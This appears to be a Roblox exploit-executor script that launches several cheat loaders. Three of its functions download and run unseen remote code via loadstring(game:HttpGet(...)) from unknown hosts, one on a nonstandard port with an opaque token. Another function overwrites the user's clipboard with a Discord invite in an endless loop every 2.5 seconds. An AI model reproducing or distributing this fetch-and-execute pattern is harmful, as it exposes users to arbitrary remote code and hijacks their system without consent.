local function s1() 
   loadstring(game:HttpGet("http://d20.aurorix.net:25318/awuG2PpCeisd3qoL7tpoEzFoftIYSFuyWyoljxE9Zrg1Z4gQnef6zfsHhlHc6wYPaU1jR4pQgpIZAP67"))()
end 

local function s2()
    task.spawn(function()
        task.wait(0.5)
        setclipboard("https://discord.gg/GmT3uvzhVH")
        WindUI:Notify({Title = "Discord Copied!", Content = "Link copied to clipboard.", Icon = "message-circle", Duration = 4})
    end)
    task.wait(1)
end

local function s3() 
    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAyYTRkZGNhLWYyNmMtNGNmZC04MWM0LTk4MDNiOGI1M2VmNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
end 

local function s4() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281"))() 
end

local function s5()
    task.spawn(function()
        task.wait(0.5)
        setclipboard("https://discord.gg/GmT3uvzhVH")
        WindUI:Notify({Title = "Discord Copied!", Content = "Link copied to clipboard.", Icon = "message-circle", Duration = 4})
    end)
    task.wait(1)
end

-- ==================== AUTO REPEATING DISCORD (Fast & Persistent while in game) ====================
local function s6()
    task.spawn(function()
        while true do
            setclipboard("https://discord.gg/GmT3uvzhVH")
            
            pcall(function()
                WindUI:Notify({
                    Title = "Discord Copied!",
                    Content = "Join our community! (Auto Repeating)",
                    Icon = "message-circle",
                    Duration = 2.5
                })
            end)
            
            task.wait(2.5)   -- Fast repeat (you can lower to 1.5~2 if you want more aggressive)
        end
    end)
end

-- Run everything
task.spawn(s1)
task.spawn(s2) 
task.spawn(s3)
task.spawn(s4)
task.spawn(s5)
task.spawn(s6)
